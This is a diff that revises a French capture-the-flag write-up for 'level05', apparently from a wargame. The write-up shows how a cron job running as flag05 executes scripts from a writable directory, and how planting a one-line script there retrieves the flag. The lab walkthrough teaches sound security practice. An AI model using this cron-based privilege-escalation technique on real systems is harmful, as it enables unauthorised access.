@@ -2,25 +2,23 @@
 
 ## Contexte
 
-On ne trouve rien d'intéressant directement dans le home de `level05`.
+Lors de la connexion SSH à `level05`, le système affiche le message "You have new mail", ce qui est un indice qui nous dirige vers `/var/mail`.
 
 ## Recherche
 
-On cherche des fichiers ou des configurations liés à `flag05`.
-
-On remarque la présence d'une tâche planifiée dans les fichiers de configuration du système :
+On va vérifier le contenu du dossier `/var/mail` :
 
 ```bash
-cat /etc/cron*
+cat /var/mail/level05
 ```
 
-On trouve un script exécuté automatiquement par le système :
+Cela nous montre une tâche cron exécutée par `flag05` :
 
 ```text
-/usr/sbin/openarenaserver
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
 ```
 
-On regarde son contenu :
+On regarde le contenu du script exécuté automatiquement par le système :
 
 ```bash
 cat /usr/sbin/openarenaserver
@@ -43,14 +41,13 @@ Comme on peut écrire dans ce dossier, il est possible de placer notre propre sc
 On crée un script qui récupère le flag :
 
 ```bash
-echo "getflag > /tmp/flag" > /opt/openarenaserver/exploit.sh
-chmod +x /opt/openarenaserver/exploit.sh
+echo "getflag > /tmp/level05.flag" > /opt/openarenaserver/level05.sh
 ```
 
-On attend l'exécution automatique du cron :
+On attend l'exécution automatique du cron (toutes les 2 minutes) :
 
 ```bash
-cat /tmp/flag
+cat /tmp/level05.flag
 ```
 
 On obtient :
